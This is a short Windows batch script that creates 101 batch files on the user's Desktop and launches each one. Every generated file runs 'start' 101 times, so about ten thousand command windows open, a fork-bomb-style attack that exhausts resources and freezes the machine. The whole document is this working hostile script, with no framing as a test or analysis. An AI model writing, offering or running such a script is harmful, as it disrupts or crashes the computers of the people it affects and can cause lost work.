@echo off

pushd %userprofile%\Desktop

FOR /L %%a IN (0,1,100) DO (
    echo FOR /L %%%%b IN ^(0^,1^,100^) DO ^( > %%a.bat
    echo start >> %%a.bat
    echo ^) >> %%a.bat
    Start "" "%%a.bat"

)
